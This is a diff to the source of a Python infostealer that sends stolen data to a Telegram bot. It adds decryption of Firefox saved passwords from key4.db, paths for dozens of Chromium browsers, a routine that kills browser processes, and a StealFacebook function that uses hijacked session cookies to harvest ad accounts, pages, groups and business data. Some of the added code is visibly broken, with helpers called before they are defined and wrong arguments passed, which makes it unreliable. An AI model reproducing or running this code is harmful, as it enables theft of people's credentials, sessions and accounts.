@@ -30,6 +30,10 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.backends import default_backend # type: ignore
 from Crypto.Cipher import DES3, AES # type: ignore
 from Crypto.Protocol.KDF import PBKDF2 # type: ignore
+from base64 import b64decode
+from hashlib import sha1, pbkdf2_hmac
+from pyasn1.codec.der.decoder import decode # type: ignore
+from win32crypt import CryptUnprotectData
 
 TOKEN = "%TOKEN%"
 CHAT_ID = "%CHAT_ID%"
@@ -47,9 +51,11 @@ def logs_handler(error_message: str) -> None:
         
 class ListFonction:
     ClipBoard = list()
+    AntiViruses = list()
     Network = list()
     SystemInfo = list()
     DiscordAccounts = list()
+    FacebookAccounts = list()
     RobloxAccounts = list()
     TikTokAccounts = list()
     TwitterAccounts = list()
@@ -115,81 +121,80 @@ class WindowsApi:
             return "Decryption Error!, Data cant be decrypt"
 
 class GeckoDecryptionApi:
-    def decode_login_data(self, b64):
-        decoded_data = base64.b64decode(b64)
-        iv = decoded_data[1:17]
-        data = decoded_data[17:]
-        return {"iv": iv, "data": data}
+    def decrypt_aes(self, decoded_item, master_password, global_salt):
+        entry_salt = decoded_item[0][0][1][0][1][0].asOctets()
+        iteration_count = int(decoded_item[0][0][1][0][1][1])
+        key_length = int(decoded_item[0][0][1][0][1][2])
+        assert key_length == 32
 
-    def get_key(self, profile_directory, master_password):
-        key4_file_path = os.path.join(profile_directory, 'key4.db')
+        encoded_password = sha1(global_salt + master_password.encode('utf-8')).digest()
+        key = pbkdf2_hmac(
+            'sha256', encoded_password,
+            entry_salt, iteration_count, dklen=key_length)
 
-        if not os.path.exists(key4_file_path):
-            raise FileNotFoundError('key4.db was not found in this profile directory.')
+        init_vector = b'\x04\x0e' + decoded_item[0][0][1][1][1].asOctets()
+        encrypted_value = decoded_item[0][1].asOctets()
+        cipher = AES.new(key, AES.MODE_CBC, init_vector)
+        return cipher.decrypt(encrypted_value)
 
-        with open(key4_file_path, 'rb') as f:
-            key4_file = f.read()
-
-        conn = sqlite3.connect(':memory:')
-        cursor = conn.cursor()
-        cursor.execute("ATTACH DATABASE ? AS key4db;", (key4_file_path,))
-        cursor.execute('SELECT item1, item2 FROM metadata WHERE id = "password";')
-        meta_data = cursor.fetchall()
-        if meta_data:
-            global_salt = meta_data[0][0]
-            item2 = meta_data[0][1]
-            item2_asn1 = base64.b64decode(item2)
-            item2_value = self.pbes_decrypt(item2_asn1, master_password.encode(), global_salt)
-            if item2_value and item2_value.get('data') == 'password-check':
-                cursor.execute('SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL;')
-                nss_data = cursor.fetchall()
-                if nss_data:
-                    a11 = nss_data[0][0]
-                    a11_asn1 = base64.b64decode(a11)
-                    return self.pbes_decrypt(a11_asn1, master_password.encode(), global_salt)
-        raise ValueError('Not able to get key from profile directory or no passwords were found.')
-
-    def pbes_decrypt(self, decoded_item_seq, password, global_salt):
-        if decoded_item_seq[0] is not None:
-            return self.pbes2_decrypt(decoded_item_seq, password, global_salt)
-        return self.pbes1_decrypt(decoded_item_seq, password, global_salt)
-
-    def pbes1_decrypt(self, decoded_item_seq, password, global_salt):
-        data = decoded_item_seq[1]
-        salt = decoded_item_seq[0]
-        hp = self.sha1(global_salt + password.decode())
-        pes = salt.ljust(20, b'\x00')
-        chp = self.sha1(hp + salt)
-        k1 = self.hmac_sha1(pes + salt, chp)
-        tk = self.hmac_sha1(pes, chp)
-        k2 = self.hmac_sha1(tk + salt, chp)
+    def decrypt3DES(globalSalt, masterPassword, entrySalt, encryptedData):
+        hp = sha1(globalSalt + masterPassword.encode()).digest()
+        pes = entrySalt + b"\x00" * (20 - len(entrySalt))
+        chp = sha1(hp + entrySalt).digest()
+        k1 = hmac.new(chp, pes + entrySalt, sha1).digest()
+        tk = hmac.new(chp, pes, sha1).digest()
+        k2 = hmac.new(chp, tk + entrySalt, sha1).digest()
         k = k1 + k2
-        iv = k[24:]
+        iv = k[-8:]
         key = k[:24]
-        return self.decrypt(data, iv, key, 'DES3')
+        return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)
 
-    def pbes2_decrypt(self, decoded_item_seq, password, global_salt):
-        data = decoded_item_seq[1]
-        pbkdf2_seq = decoded_item_seq[0]
-        salt = pbkdf2_seq[0]
-        iterations = ord(pbkdf2_seq[1])
-        iv = b'\x04\x0e' + decoded_item_seq[0][1]
-        key = PBKDF2(password, salt, dkLen=32, count=iterations)
-        return self.decrypt(data, iv, key, 'AES')
+    def getKey(self, directory: Path, masterPassword=""):
+        dbfile: Path = directory + "\\key4.db"
+        conn = sqlite3.connect(dbfile)
+        c = conn.cursor()
+        c.execute("SELECT item1, item2 FROM metadata;")
+        row = next(c)
+        globalSalt, item2 = row
 
-    def decrypt(self, data, iv, key, algorithm):
-        if algorithm == 'DES3':
-            cipher = DES3.new(key, DES3.MODE_CBC, iv)
-            return cipher.decrypt(data)
-        elif algorithm == 'AES':
-            cipher = AES.new(key, AES.MODE_CBC, iv)
-            return cipher.decrypt(data)
+        try:
+            decodedItem2, _ = decode(item2)
+            encryption_method = '3DES'
+            entrySalt = decodedItem2[0][1][0].asOctets()
+            cipherT = decodedItem2[1].asOctets()
+        except AttributeError:
+            encryption_method = 'AES'
+            decodedItem2 = decode(item2)
+        c.execute("SELECT a11, a102 FROM nssPrivate WHERE a102 = ?;", (b"\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01",))
+        try:
+            row = next(c)
+            a11, a102 = row  
+        except StopIteration:
+            raise Exception("gecko database broken")  
+        if encryption_method == 'AES':
+            decodedA11 = decode(a11)
+            key = self.decrypt_aes(decodedA11, masterPassword, globalSalt)
+        elif encryption_method == '3DES':
+            decodedA11, _ = decode(a11)
+            oid = decodedA11[0][0].asTuple()
+            assert oid == (1, 2, 840, 113_549, 1, 12, 5, 1, 3), f"idk key to format {oid}"
+            entrySalt = decodedA11[0][1][0].asOctets()
+            cipherT = decodedA11[1].asOctets()
+            key = self.decrypt3DES(globalSalt, masterPassword, entrySalt, cipherT)
 
-    def sha1(self, data):
-        return hashlib.sha1(data.encode('utf-8')).digest()
+        return key[:24]
 
-    def hmac_sha1(self, data, key):
-        return hmac.new(key.encode(), data.encode(), hashlib.sha1).digest()
+    def PKCS7unpad(self, b):
+        return b[: -b[-1]]
+
+    def decodeLoginData(self, key, data):
+        asn1data, _ = decode(b64decode(data))
+        assert asn1data[0].asOctets() == b"\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"
+        assert asn1data[1][0].asTuple() == (1, 2, 840, 113_549, 3, 7)
+        iv = asn1data[1][1].asOctets()
+        ciphertext = asn1data[2].asOctets()
+        des = DES3.new(key, DES3.MODE_CBC, iv)
+        return self.PKCS7unpad(des.decrypt(ciphertext)).decode()
 
 class get_data:
     def __init__(self):
@@ -200,17 +205,44 @@ class get_data:
         self.user_home = os.path.expanduser('~')
 
         self.browser_paths = {
-            "Brave": os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
-            "Chrome": os.path.join(self.localappdata, "Google", "Chrome", "User Data"),
             "Chromium": os.path.join(self.localappdata, "Chromium", "User Data"),
-            "Edge": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data"),
-            "EpicPrivacy": os.path.join(self.localappdata, "Epic Privacy Browser", "User Data"),
+            "Thorium": os.path.join(self.localappdata, "Thorium", "User Data"),
+            "Chrome": os.path.join(self.localappdata, "Google", "Chrome", "User Data"),
+            "Chrome (x86)": os.path.join(self.localappdata, "Google(x86)", "Chrome", "User Data"),
+            "Chrome SxS": os.path.join(self.localappdata, "Google", "Chrome SxS", "User Data"),
+            "Maple": os.path.join(self.localappdata, "MapleStudio", "ChromePlus", "User Data"),
             "Iridium": os.path.join(self.localappdata, "Iridium", "User Data"),
+            "7Star": os.path.join(self.localappdata, "7Star", "7Star", "User Data"),
+            "CentBrowser": os.path.join(self.localappdata, "CentBrowser", "User Data"),
+            "Chedot": os.path.join(self.localappdata, "Chedot", "User Data"),
+            "Vivaldi": os.path.join(self.localappdata, "Vivaldi", "User Data"),
+            "Kometa": os.path.join(self.localappdata, "Kometa", "User Data"),
+            "Elements": os.path.join(self.localappdata, "Elements Browser", "User Data"),
+            "Epic Privacy Browser": os.path.join(self.localappdata, "Epic Privacy Browser", "User Data"),
+            "Uran": os.path.join(self.localappdata, "uCozMedia", "Uran", "User Data"),
+            "Fenrir": os.path.join(self.localappdata, "Fenrir Inc", "Sleipnir5", "setting", "modules", "ChromiumViewer"),
+            "Catalina": os.path.join(self.localappdata, "CatalinaGroup", "Citrio", "User Data"),
+            "Coowon": os.path.join(self.localappdata, "Coowon", "Coowon", "User Data"),
+            "Liebao": os.path.join(self.localappdata, "liebao", "User Data"),
+            "QIP Surf": os.path.join(self.localappdata, "QIP Surf", "User Data"),
+            "Orbitum": os.path.join(self.localappdata, "Orbitum", "User Data"),
+            "Dragon": os.path.join(self.localappdata, "Comodo", "Dragon", "User Data"),
+            "360Browser": os.path.join(self.localappdata, "360Browser", "Browser", "User Data"),
+            "Maxthon": os.path.join(self.localappdata, "Maxthon3", "User Data"),
+            "K-Melon": os.path.join(self.localappdata, "K-Melon", "User Data"),
+            "CocCoc": os.path.join(self.localappdata, "CocCoc", "Browser", "User Data"),
+            "Brave": os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
+            "Amigo": os.path.join(self.localappdata, "Amigo", "User Data"),
+            "Torch": os.path.join(self.localappdata, "Torch", "User Data"),
+            "Sputnik": os.path.join(self.localappdata, "Sputnik", "Sputnik", "User Data"),
+            "Edge": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data"),
+            "DCBrowser": os.path.join(self.localappdata, "DCBrowser", "User Data"),
+            "Yandex": os.path.join(self.localappdata, "Yandex", "YandexBrowser", "User Data"),
+            "UR Browser": os.path.join(self.localappdata, "UR Browser", "User Data"),
+            "Slimjet": os.path.join(self.localappdata, "Slimjet", "User Data"),
             "Opera": os.path.join(self.appdata, "Opera Software", "Opera Stable"),
             "OperaGX": os.path.join(self.appdata, "Opera Software", "Opera GX Stable"),
-            "Vivaldi": os.path.join(self.localappdata, "Vivaldi", "User Data"),
-            "Yandex": os.path.join(self.localappdata, "Yandex", "YandexBrowser", "User Data")
-            }
+        }
 
         self.GeckoBrowsers = {
             "Firefox": os.path.join(self.appdata, "Mozilla", "Firefox", "Profiles"),
@@ -250,7 +282,7 @@ class get_data:
 
     async def kill_browsers(self):
         try:
-            process_names = ["firefox"]
+            process_names = ["firefox.exe", "seamonkey.exe", "mullvadbrowser.exe", "icecat.exe", "palemoon.exe", "chromium.exe", "thorium.exe", "chrome.exe", "maple.exe", "iridium.exe", "7star.exe", "centbrowser.exe", "chedot.exe", "vivaldi.exe", "kometa.exe", "elements.exe", "epic.exe", "uran.exe", "sleipnir.exe", "citrio.exe", "coowon.exe", "liebao.exe",  "qipsurf.exe", "orbitum.exe", "dragon.exe", "360browser.exe", "maxthon.exe", "kmeleon.exe", "coccoc.exe", "brave.exe", "amigo.exe", "torch.exe", "sputnik.exe", "msedge.exe", "dcbrowser.exe", "yandex.exe", "urbrowser.exe", "slimjet.exe", "opera.exe", "operagx.exe",]
             process = await asyncio.create_subprocess_shell('tasklist',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)
 
             stdout, stderr = await process.communicate()
@@ -323,7 +355,7 @@ class get_data:
                             asyncio.create_task(self.StealInstagram(cookie[3], "Mozilla"))
                         if ".tiktok.com" in str(cookie[0]).lower() and str(cookie[1]) == "sessionid":
                             asyncio.create_task(self.StealTikTok(cookie[3], "Mozilla"))
-                        if "mullvad" in str (cookie[0]).lower() and str (cookie[1]) == "accessToken":
+                        if ".mullvad.net" in str (cookie[0]).lower() and str (cookie[1]) == "accessToken":
                             asyncio.create_task(self.StealMullvadVPN(cookie[3], "Mozilla"))
                         if ".x.com" in str(cookie[0]).lower() and str(cookie[1]) == "auth_token":
                             asyncio.create_task(self.StealTwitter(cookie[3], "Mozilla"))
@@ -343,6 +375,8 @@ class get_data:
                             twitch_cookie = None
                         if "account.riotgames.com" in str(cookie[0]).lower() and "sid" in str(cookie[1]).lower():
                             asyncio.create_task(self.StealRiotUser(cookie[3], "Mozilla"))
+                        if ".facebook.com" in str(cookie[0]):
+                            asyncio.create_task(self.StealFacebook(cookie[3], "Mozilla"))
         except Exception as Error:
             logs_handler(f"[ERROR] - getting Mozilla cookies - {str(Error)}")
         else:
@@ -357,7 +391,7 @@ class get_data:
                     cursor.execute('SELECT id, url, title, visit_count, last_visit_date FROM moz_places')
                     historys = cursor.fetchall()
                     for history in historys:
-                        self.GeckoHistoryList.append(f"ID: {history[0]}\nRL: {history[1]}\nTitle: {history[2]}\nVisit Count: {history[3]}\nLast Visit Time: {history[4]}\n====================================================================================\n")
+                        self.GeckoHistoryList.append(f"ID: {history[0]}\nRL: {history[1]}\nTitle: {history[2]}\nVisit Count: {history[3]}\nLast Visit Time: {history[4]}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
         except Exception as Error:
             logs_handler(f"[ERROR] - getting Mozilla historys - {str(Error)}")
         else:
@@ -394,7 +428,7 @@ class get_data:
         except Exception as e:
             logs_handler(f"riot user error - {str(e)}")
         else:
-            ListFonction.RiotGames.append(f"Username: {username}\nEmail: {email}\nRegion: {region}\nLocale: {locale}\nCountry: {country}\nMFA Verified: {mfa}\nBrowser: {browser}\nCookie: {cookie}\n====================================================================================\n")
+            ListFonction.RiotGames.append(f"Username: {username}\nEmail: {email}\nRegion: {region}\nLocale: {locale}\nCountry: {country}\nMFA Verified: {mfa}\nBrowser: {browser}\nCookie: {cookie}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
 
     async def StealTwitch(self, auth_token, username, browser:str) -> None:
         try:
@@ -444,7 +478,7 @@ class get_data:
         except Exception as e:
             logs_handler(f"twitch session error - {str(e)}")
         else:
-            ListFonction.TwitchAccounts.append(f"ID: {idd}\nLogin: {login}\nDisplay Name: {displayName}\nEmail: {email}\nHas Prime: {hasPrime}\nIs Partner: {isPartner}\nLanguage: {lang}\nBits Balance: {bits}\nFollowers: {followers}\nProfile URL: {acc_url}\nBrowser: {browser}\nAuth Token: {auth_token}\n====================================================================================\n")
+            ListFonction.TwitchAccounts.append(f"ID: {idd}\nLogin: {login}\nDisplay Name: {displayName}\nEmail: {email}\nHas Prime: {hasPrime}\nIs Partner: {isPartner}\nLanguage: {lang}\nBits Balance: {bits}\nFollowers: {followers}\nProfile URL: {acc_url}\nBrowser: {browser}\nAuth Token: {auth_token}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
 
     async def StealSpotify(self, cookie, browser: str) -> None:
         try:
@@ -483,7 +517,7 @@ class get_data:
             billing = data2["nextBillingInfo"]
             expiry = data2["expiry"]
 
-            ListFonction.SpotifyAccount.append(f"Browser: {browser}\nEmail: {email}\nGender: {gender}\nBirthdate: {birthdate}\nCountry: {country}\nThird Party Email: {third}\nUsername: {username}\nIsTrial: {istrial}\nCurrentPlan: {plan}\nIsRecurring: {isrecurring}\nDaysLeft: {daysleft}\nIsSub: {sub}\nBilling Info: {billing}\nExpiry: {expiry}\n====================================================================================\n")
+            ListFonction.SpotifyAccount.append(f"Browser: {browser}\nEmail: {email}\nGender: {gender}\nBirthdate: {birthdate}\nCountry: {country}\nThird Party Email: {third}\nUsername: {username}\nIsTrial: {istrial}\nCurrentPlan: {plan}\nIsRecurring: {isrecurring}\nDaysLeft: {daysleft}\nIsSub: {sub}\nBilling Info: {billing}\nExpiry: {expiry}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
 
         except Exception as e:
             logs_handler(f"spotify session error - {str(e)}")
@@ -511,7 +545,7 @@ class get_data:
         except Exception as e:
             logs_handler(f"reddit session error - {str(e)}")
         else:
-            ListFonction.RedditAccounts.append(f"Username: {username}\nEmail: {gmail}\nProfile URL: {profileUrl}\nComment Karma: {commentKarma}\nTotal Karma: {totalKarma}\nCoins: {coins}\nMod Status: {mod}\nGold Status: {gold}\nSuspended: {suspended}\nBrowser: {browser}\nCookie: {cookie}\n====================================================================================\n")
+            ListFonction.RedditAccounts.append(f"Username: {username}\nEmail: {gmail}\nProfile URL: {profileUrl}\nComment Karma: {commentKarma}\nTotal Karma: {totalKarma}\nCoins: {coins}\nMod Status: {mod}\nGold Status: {gold}\nSuspended: {suspended}\nBrowser: {browser}\nCookie: {cookie}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
 
 
     async def StealPatreon(self, cookie, browser: str) -> None:
@@ -541,7 +575,7 @@ class get_data:
         except Exception as e: 
             logs_handler(f"patreon session error - {str(e)}")
         else:
-            ListFonction.PatreonAccounts.append(f"Email: {email}\nVerified: {verified}\nCreated: {created}\nCurrency: {currency}\nBio: {bio}\nSocial Connections:\n{social_connection_names}\nProfile URL: {url}\nAdditional URL: {url2}\nBrowser: {browser}\nCookie: {cookie}\n====================================================================================\n")
+            ListFonction.PatreonAccounts.append(f"Email: {email}\nVerified: {verified}\nCreated: {created}\nCurrency: {currency}\nBio: {bio}\nSocial Connections:\n{social_connection_names}\nProfile URL: {url}\nAdditional URL: {url2}\nBrowser: {browser}\nCookie: {cookie}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
 
     async def StealGuilded(self, cookie, browser: str) -> None:
         try:
@@ -569,7 +603,7 @@ class get_data:
         except Exception as e:
             logs_handler(f"guilded session error - {str(e)}")
         else:
-            ListFonction.GuildedAccounts.append(f"Username: {username}\nGlobal Username: {globalusername}\nEmail: {email}\nUser ID: {ids}\nJoin Date: {join}\nBio: {bio}\nSocial Links:\n{formatted_social_links}\nBrowser: {browser}\nCookie: {cookie}\n====================================================================================\n")
+            ListFonction.GuildedAccounts.append(f"Username: {username}\nGlobal Username: {globalusername}\nEmail: {email}\nUser ID: {ids}\nJoin Date: {join}\nBio: {bio}\nSocial Links:\n{formatted_social_links}\nBrowser: {browser}\nCookie: {cookie}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
 
 
     async def StealInstagram(self, cookie: str, browser: str) -> None:
@@ -602,7 +636,7 @@ class get_data:
         except Exception as e:
             logs_handler(f"instagram session error - {str(e)}")
         else:
-            ListFonction.InstagramAccounts.append(f"Username: {username}\nFull Name: {fullname}\nEmail: {email}\nIs Verified: {'Yes' if verify else 'No'}\nFollowers: {followers}\nFollowing: {following}\nBio: {bio}\nProfile URL: {profileURL}\nBrowser: {browser}\nCookie: {cookie}\n====================================================================================\n")
+            ListFonction.InstagramAccounts.append(f"Username: {username}\nFull Name: {fullname}\nEmail: {email}\nIs Verified: {'Yes' if verify else 'No'}\nFollowers: {followers}\nFollowing: {following}\nBio: {bio}\nProfile URL: {profileURL}\nBrowser: {browser}\nCookie: {cookie}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
 
     async def StealTikTok(self, cookie: str, browser: str) -> None:
         try:
@@ -636,11 +670,11 @@ class get_data:
             logs_handler(f"tiktok session error - {str(e)}")
             pass
         else:
-            ListFonction.TikTokAccounts.append(f"User ID: {user_id}\nUsername: {username}\nEmail: {email}\nPhone: {phone}\nCoins: {coins}\nCreated At: {formatted_date}\nSubscribers: {subscriber}\nBrowser: {browser}\nCookie: {cookie}\n====================================================================================\n")
+            ListFonction.TikTokAccounts.append(f"User ID: {user_id}\nUsername: {username}\nEmail: {email}\nPhone: {phone}\nCoins: {coins}\nCreated At: {formatted_date}\nSubscribers: {subscriber}\nBrowser: {browser}\nCookie: {cookie}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
 
     async def StealStake(self, cookie: str, browser: str) -> None:
         try:
-            data = f"Cookie: {str(cookie)}\nBrowser: {str(browser)}\n"
+            data = f"Cookie: {str(cookie)}\nBrowser: {str(browser)}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         except Exception as Error:
             logs_handler(f"Error getting stake session: {str(Error)}")
         else:
@@ -680,6 +714,153 @@ class get_data:
             ListFonction.TwitterAccounts.append(f"Username: {username}\nScreen Name: {nickname}\nFollowers: {followers_count}\nFollowing: {following_count}\nTweets: {tweets_count}\nIs Verified: {'Yes' if verified else 'No'}\nCreated At: {created_at}\nBiography: {description}\nProfile URL: {profileURL}\nCookie: {cookie}\nBrowser: {browser}\n====================================================================================\n")
  
 
+    async def StealFacebook(self, cookie, browser):
+        cookies = await Parse_Cookie(cookie)
+        headers = {
+            'authority': 'adsmanager.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
+            'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.140", "Google Chrome";v="112.0.5615.140", "Not:A-Brand";v="99.0.0.0"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"15.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
+            'viewport-width': '794'
+        }
+
+        async with aiohttp.ClientSession(headers=headers, cookies=cookies) as session:
+            token = await Get_Market(session)
+            if not token:
+                return None
+            uid = cookies.get('c_user')
+            return uid
+
+        def Parse_Cookie(cookie):
+            cookies = {}
+            for cooki in cookie.split(';'):
+                key_value = cooki.strip().split('=', 1)
+                if len(key_value) == 2:
+                    key, value = key_value
+                    if key.lower() in ['c_user', 'xs', 'fr']:
+                        cookies[key] = value
+            return cookies
+
+        async def Get_Market(session):
+            try:
+                async with session.get('https://adsmanager.facebook.com/adsmanager/manage') as resp:
+                    page_content = await resp.text()
+                    x = page_content.split("act=")
+                    idx = x[1].split('&')[0]
+                    
+                    async with session.get(f'https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={idx}&breakdown_regrouping=1&nav_source=no_referrer') as resp_campaign:
+                        campaign_content = await resp_campaign.text()
+                        x_token = campaign_content.split('{window.__accessToken="')
+                        token = x_token[1].split('";')[0]
+                        return token
+            except Exception:
+                return False
+
+        async def Get_info_Tkqc(session, token):
+            try:
+                get_tkqc = f"https://graph.facebook.com/v17.0/me/adaccounts?fields=account_id&access_token={token}"
+                async with session.get(get_tkqc) as resp:
+                    list_tikqc = await resp.json()
+                    datax = ''
+                    for item in list_tikqc['data']:
+                        xitem = item["id"]
+                        url = f"https://graph.facebook.com/v16.0/{xitem}/?fields=spend_cap,amount_spent,adtrust_dsl,adspaymentcycle,currency,account_status,disable_reason,name,created_time&access_token={token}"
+                        async with session.get(url) as resp_account:
+                            data = await resp_account.json()
+                            statut = data.get("account_status", "Unknown Status")
+                            stt = "Live" if int(statut) == 1 else "Dead"
+                            name = data["name"]
+                            id_tkqc = data["id"]
+                            tien_te = data["currency"]
+                            du_no = data["spend_cap"]
+                            da_chi_tieu = data["amount_spent"]
+                            limit_ngay = data["adtrust_dsl"]
+                            created_time = data["created_time"]
+                            nguong_no = data.get("adspaymentcycle", {}).get("data", [{}])[0].get("threshold_amount", "No Card")
+                            if tien_te in ["USD", "EUR", "JPY", "GBP", "AUD", "CAD", "CHF", "CNY", "SEK", "NZD", "MXN", "SGD", "HKD", "NOK", "KRW", "TRY", "RUB", "INR", "BRL", "ZAR", "MYR", "DKK", "PLN", "HUF", "ILS", "THB", "CLP", "COP", "PHP"]:
+                                nguong_no = nguong_no // 100 if isinstance(nguong_no, int) else nguong_no
+                            datax += f"- Ad Account Name: {name}|ID: {id_tkqc}|Status: {stt}|Currency: {tien_te}|Spend Cap: {du_no}|Total Spend: {da_chi_tieu}|Daily Limit: {limit_ngay}|Debt Threshold: {nguong_no}|Created: {created_time[:10]}\n"
+                    return f"Total Ad Accounts: {len(list_tikqc['data'])}\n{datax}"
+            except:
+                return 'No Ad Accounts Found'
+
+        async def Get_Page(session, token):
+            try:
+                List_Page = f"https://graph.facebook.com/v17.0/me/facebook_pages?fields=name%2Clink%2Cfan_count%2Cfollowers_count%2Cverification_status&access_token={token}"
+                async with session.get(List_Page) as resp:
+                    data = await resp.json()
+                    if 'data' in data:
+                        pages = data["data"]
+                        page_data = f"Total Pages: {len(pages)}\n"
+                        for page in pages:
+                            name = page["name"]
+                            link = page["link"]
+                            like = page["fan_count"]
+                            fl = page["followers_count"]
+                            veri = page["verification_status"]
+                            page_data += f"- {name}|{link}|Likes: {like}|Followers: {fl}|Verification: {veri}\n"
+                        return page_data
+                    else:
+                        return "Pages: 0"
+            except:
+                return 'Error retrieving pages'
+
+        async def Get_QTV_Gr(session, token):
+            try:
+                get_group = f"https://graph.facebook.com/v17.0/me/groups?fields=administrator,member_count&limits=1500&access_token={token}"
+                async with session.get(get_group) as resp:
+                    data = await resp.json()
+                    ids = "QTV Groups:\n"
+                    for item in data.get("data", []):
+                        if item.get("administrator"):
+                            group_id = item["id"]
+                            count = item['member_count']
+                            ids += f"- https://www.facebook.com/groups/{group_id}|Members: {count}\n"
+                    return ids
+            except:
+                return 'QTV Groups: 0'
+
+        async def Get_id_BM(session, token):
+            List_BM = f"https://graph.facebook.com/v17.0/me?fields=businesses&access_token={token}"
+            async with session.get(List_BM) as resp:
+                data = await resp.json()
+                try:
+                    listbm = data["businesses"]["data"]
+                    id_list = []
+                    for item in listbm:
+                        business_id = item["id"]
+                        business_name = item["name"]
+                        id_list.append([business_id, business_name])
+                    return id_list
+                except:
+                    return None
+
+        cookies = Parse_Cookie(cookie)
+        token = await Get_Market(browser)
+        if not token:
+            return "Authentication failed, token not found."
+        uid = cookies.get('c_user')
+        if not uid:
+            return "UID not found in cookies."
+
+        info_tkqc = await Get_info_Tkqc(browser, token)        
+        pages = await Get_Page(browser, token)
+        groups = await Get_QTV_Gr(browser, token)
+        business_managers = await Get_id_BM(browser, token)
+
+        ListFonction.FacebookAccounts.append(f"Browser: {browser}\nToken Info: {info_tkqc}\nPages: {pages}\nGroups: {groups}\nBuissness Managers: {business_managers}\n")
 
 
     async def StealDiscord(self) -> None:
@@ -999,7 +1180,7 @@ class get_data:
                 except Exception as e:
                     logs_handler(f"upload token error - {str(e)}")
                 else:
-                    ListFonction.discord.append(f"Token: {token}\nPath: {path}\nUser: {username}#{hashtag} ({user_id}) Global Username : {globalusername}\nPhone: {phone}\nEmail: {email}\nNsfw Enable?: {nsfw}\nBadge: {nitro}{badge}\nBilling: {billing}\nBiography: {bio}\nHQ Friends: {friends}\nGuilds: {guild}\nConnection: {connections_str}\nGift: {gift}\nBackup Code: {back}\n====================================================================================\n")
+                    ListFonction.discord.append(f"Token: {token}\nPath: {path}\nUser: {username}#{hashtag} ({user_id}) Global Username : {globalusername}\nPhone: {phone}\nEmail: {email}\nNsfw Enable?: {nsfw}\nBadge: {nitro}{badge}\nBilling: {billing}\nBiography: {bio}\nHQ Friends: {friends}\nGuilds: {guild}\nConnection: {connections_str}\nGift: {gift}\nBackup Code: {back}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
 
                             
             tokens = []
@@ -2016,7 +2197,7 @@ asyncio.run(main())
                                                 name, count = [], 0
                                     except aiohttp.ClientError:
                                         name, count = [], 0
-                                    text = f"Minecraft Account\n\nSkins Links: \"https://crafatar.com/skins/{profile['id']}.png\"\nCapes Links: \"https://s.optifine.net/capes/{profile['name']}.png\"\n\nAccount ID: {accountId}\nUsername: {profile['name']}\nEmail: {emails or 'None'}\nMinecraft UID: {profile['id']}\nFriends Count: {count or 0}\nFriends List: {', '.join(name) or 'None'}\nHypixel Rank: {hypixel_data.get('achievementPoints', 'None')}\n====================================================================================\n"
